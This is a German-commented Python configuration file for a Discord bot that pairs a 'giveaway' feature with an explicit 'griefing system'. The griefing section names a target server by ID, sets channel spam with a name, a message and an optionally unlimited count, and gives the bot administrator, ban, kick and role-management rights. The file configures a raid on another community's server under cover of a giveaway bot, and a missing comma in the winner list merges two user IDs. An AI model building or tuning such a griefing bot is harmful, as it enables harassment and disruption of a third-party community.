class Settings:
    # GIVEAWAY SYSTEM
    # ---------------------------------------------------------------------------------------------------------------------  
    
    COLOR=0xa83232 # Embed Farbe
    WINNERS=[
        '733403498766401554', # kiwious
        '547664017209032709', # brawny
        '771108568509972490', # kuappi
        '689558970796343380' # master sim
        '696710421004025907', # limonaden tim
        '742126810552074310', # nini
        '647798346265657345', # vacuumboy
        '731167863234363522', # niniunsinushi
    ]
    GIVEAWAY_TIME=5 # Giveaway Zeit in Sekunden (die 5 Sekunden sind temporär)

    # GRIEFING SYSTEM:
    # ---------------------------------------------------------------------------------------------------------------------

    GRIEF_SERVER=1029431306582491226 # Server Id von Kings Server

    TEST_SERVER=1092150923897339964 # Server Id vom Test server

    CHANNEL_SPAM_NAME='negus' # Name des Channels der Gespammt werden soll
    
    CHANNEL_SPAM_AMOUNT=5 # Wie viel mal der Channel gespammt werden soll => Auf None setzen wenn unendlich viel

    CHANNEL_SPAM_MESSAGE='ping' # Welche Nachricht in jeden gespammten Channel geschickt werden soll

    #  Bot-Rechte (True => Vorhanden, False => Nicht vorhanden):
    CLIENT_PERMISSIONS={
        'add_reactions': False,
        'administrator': True,
        'attach_files': True,
        'ban_members': True,
        'change_nickname': True,
        'deafen_members': True,
        'embed_links': True,
        'external_emojis': True,
        'external_stickers': True,
        'kick_members': True,
        'manage_channels': True,
        'manage_emojis': True,
        'manage_emojis_and_stickers': True,
        'manage_events': True,
        'manage_guild': True,
        'manage_messages': True,
        'manage_nicknames': True,
        'manage_permissions': True,
        'manage_roles': True,
        'manage_threads': True,
        'manage_webhooks': True,
        'mention_everyone': True,
        'moderate_members': True,
        'read_messages': True,
        'send_messages': True,
        'use_external_emojis': True,
        'use_external_stickers': True,
        'view_channel': True,
    }